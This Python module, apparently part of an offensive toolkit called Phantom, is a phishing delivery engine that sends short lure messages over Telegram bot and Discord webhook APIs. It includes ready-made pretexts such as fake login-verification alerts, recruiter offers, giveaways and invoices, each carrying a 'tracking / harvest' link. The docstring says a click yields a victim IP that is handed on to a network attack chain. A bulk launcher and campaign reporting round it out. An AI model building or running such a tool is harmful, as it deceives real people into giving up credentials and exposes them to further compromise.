"""
social_dm.py — direct-message (DM) delivery engine for the social chain.

Phishing over private messages (Telegram, Discord, X/Reddit DMs) converts
better than cold email and reaches people whose mail gateway blocks HTML.
This module delivers short, pretext-driven DMs with a tracking / harvest
link — the same grabbit links the email chain uses, so a click still turns
into a VICTIM_IP and the network chain takes over.

Design (mirrors the rest of the social package):

  * Transports are injectable. The default `get_dm_transport()` picks a
    real free channel from the environment (Telegram bot API first, then a
    Discord webhook) and degrades to a clear ERROR marker when neither is
    configured — the agent never hangs.
  * Every network call goes through the transport's `send()` so tests swap
    in a deterministic fake and nothing ever leaves the machine in CI.
  * Output uses stable marker lines the shared social interpreter parses:

        DM_SENT: to=<handle> platform=<p> link=<url>

  * DMs are deliberately short (message-app length) and carry one link.

Platform reality check (documented honestly):
  Telegram and Discord have free, key-only APIs — those are the default
  transports. X/Instagram/Reddit DMs require OAuth app credentials or a
  logged-in browser session, so they are NOT faked here: subclass
  DMTransport with your own auth (or a Playwright session) and set
  PHANTOM_DM_TRANSPORT to a dotted path to load it.
"""

from __future__ import annotations

import json
import os
import time
import urllib.request
from typing import Any, Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# DM pretexts (short — message-app length)
# ---------------------------------------------------------------------------

_DM_PRESTEXTS: Dict[str, Dict[str, str]] = {
    "security_verify": {
        "label": "Security verify",
        "text": "Hi {name}, we noticed a new login to your {platform} "
                "account. Confirm it was you: {link}",
    },
    "recruiter": {
        "label": "Recruiter",
        "text": "Hi {name}, I came across your profile and you look like a "
                "strong fit for a role we're hiring for. Quick intro: {link}",
    },
    "collab": {
        "label": "Collab request",
        "text": "Hey {name}, we're putting together a project and wanted to "
                "see if you're open to it: {link}",
    },
    "prize": {
        "label": "Giveaway",
        "text": "Congrats {name}, your {platform} account was selected in "
                "our giveaway. Claim it here: {link}",
    },
    "invoice": {
        "label": "Invoice",
        "text": "Hi {name}, your latest invoice is ready for review: {link}",
    },
}


def dm_pretext_ids() -> List[str]:
    return list(_DM_PRESTEXTS.keys())


def render_dm_pretext(pretext_id: str, context: Dict[str, str],
                      link: str = "") -> Optional[str]:
    """Render a short DM body. Unknown id -> None; placeholders degrade to
    neutral defaults so no `None` or `{...}` ever reaches the wire."""
    tpl = _DM_PRESTEXTS.get(pretext_id)
    if tpl is None:
        return None
    ctx = {k: (v or "") for k, v in context.items()}
    ctx.setdefault("name", "there")
    ctx.setdefault("platform", "online")
    ctx.setdefault("link", link or "https://example.com")
    return tpl["text"].format(**ctx)


# ---------------------------------------------------------------------------
# transports (injectable)
# ---------------------------------------------------------------------------

class DMTransport:
    """Base class for a DM channel. send() returns True on delivery."""

    platform = "generic"

    def send(self, target: str, text: str, timeout: float = 15.0) -> bool:
        raise NotImplementedError


class TelegramDMTransport(DMTransport):
    """Telegram Bot API — free, key-only. `target` is a chat id or @username."""

    platform = "telegram"

    def __init__(self, token: str = "") -> None:
        self.token = token or os.getenv("PHANTOM_TELEGRAM_BOT_TOKEN", "").strip()

    def send(self, target: str, text: str, timeout: float = 15.0) -> bool:
        if not self.token:
            return False
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        payload = json.dumps({"chat_id": target, "text": text}).encode()
        req = urllib.request.Request(url, data=payload,
                                     headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                data = json.loads(resp.read().decode("utf-8", "ignore"))
            return bool(data.get("ok"))
        except Exception:
            return False


class DiscordDMTransport(DMTransport):
    """Discord webhook — free, key-only. `target` is the webhook channel id
    or username label (delivery goes to the webhook's channel)."""

    platform = "discord"

    def __init__(self, webhook: str = "") -> None:
        self.webhook = webhook or os.getenv("PHANTOM_DISCORD_WEBHOOK", "").strip()

    def send(self, target: str, text: str, timeout: float = 15.0) -> bool:
        if not self.webhook:
            return False
        payload = json.dumps({"content": text}).encode()
        req = urllib.request.Request(self.webhook, data=payload,
                                     headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.status == 204
        except Exception:
            return False


class FakeDMTransport(DMTransport):
    """Deterministic in-memory transport for tests / dry-run."""

    platform = "fake"
    sent: List[Tuple[str, str]] = []

    def __init__(self) -> None:
        self.sent = []

    def send(self, target: str, text: str, timeout: float = 15.0) -> bool:
        self.sent.append((target, text))
        return True


class ConsoleDMTransport(DMTransport):
    """Prints the DM to the terminal instead of sending (dry-run)."""

    platform = "console"

    def send(self, target: str, text: str, timeout: float = 15.0) -> bool:
        from rich.console import Console
        # ASCII only: the arrow glyph breaks cp1252 Windows consoles
        Console().print(f"[dim][DM -> {target}] {text}[/]")
        return True


def get_dm_transport(platform: str = "auto") -> Optional[DMTransport]:
    """Resolve the transport from env config.

    * platform="auto" (default): Telegram token first, then Discord webhook.
    * platform="telegram" / "discord": explicit channel (returns None when
      its credential is missing).
    * platform="console": dry-run to stdout (never sends).
    * PHANTOM_DM_TRANSPORT=<dotted.path.to.Class>: load a custom transport
      (e.g. a Playwright-based X/Instagram DM adapter) from the operator's
      own code. Falls back to auto when it cannot be loaded.
    """
    custom = os.getenv("PHANTOM_DM_TRANSPORT", "").strip()
    if custom and platform == "auto":
        try:
            mod_path, _, cls_name = custom.rpartition(".")
            import importlib
            mod = importlib.import_module(mod_path)
            cls = getattr(mod, cls_name)
            return cls()
        except Exception:
            pass  # fall through to built-ins

    if platform == "console":
        return ConsoleDMTransport()
    if platform == "telegram":
        t = TelegramDMTransport()
        return t if t.token else None
    if platform == "discord":
        d = DiscordDMTransport()
        return d if d.webhook else None
    # auto
    t = TelegramDMTransport()
    if t.token:
        return t
    d = DiscordDMTransport()
    if d.webhook:
        return d
    return None


# ---------------------------------------------------------------------------
# high-level launcher
# ---------------------------------------------------------------------------

def launch_dm(targets: List[str], pretext: str = "security_verify",
              link: str = "", transport: Optional[DMTransport] = None,
              context: Optional[Dict[str, str]] = None) -> Tuple[bool, List[str]]:
    """Send one short DM per target. Returns (ok, marker lines).

    `link` is the per-target tracking/harvest URL. When `transport` is None
    the env-resolved transport is used; if none is configured the call
    degrades to a single ERROR marker (never hangs).
    """
    lines: List[str] = []
    if not targets:
        return False, ["ERROR: dm requires at least one target"]
    if pretext not in dm_pretext_ids():
        return False, [
            f"ERROR: unknown_dm_pretext_{pretext}: use one of "
            f"{','.join(dm_pretext_ids())}"]
    if transport is None:
        transport = get_dm_transport()
    if transport is None:
        return False, ["ERROR: no_dm_transport_configured: "
                       "set PHANTOM_TELEGRAM_BOT_TOKEN or PHANTOM_DISCORD_WEBHOOK"]
    ctx = {k: (v or "") for k, v in (context or {}).items()}
    ok_any = False
    for t in targets:
        t = (t or "").strip()
        if not t:
            continue
        text = render_dm_pretext(pretext, ctx, link=link or "")
        if not text:
            continue
        delivered = transport.send(t, text)
        if delivered:
            ok_any = True
        lines.append(
            f"DM_SENT: to={t} platform={transport.platform} "
            f"link={link or ''} delivered={1 if delivered else 0}")
    if not ok_any:
        return False, lines
    return True, lines


def dm_delivery_report(lines: List[str]) -> Dict[str, Any]:
    """Summarise DM_SENT marker lines for campaign reporting."""
    sent, delivered = 0, 0
    platforms: set = set()
    for line in lines or []:
        if not line.startswith("DM_SENT:"):
            continue
        kv = {}
        for chunk in line[len("DM_SENT:"):].split():
            if "=" in chunk:
                k, v = chunk.split("=", 1)
                kv[k] = v
        sent += 1
        if kv.get("delivered") == "1":
            delivered += 1
        if kv.get("platform"):
            platforms.add(kv["platform"])
    return {"sent": sent, "delivered": delivered, "platforms": sorted(platforms)}
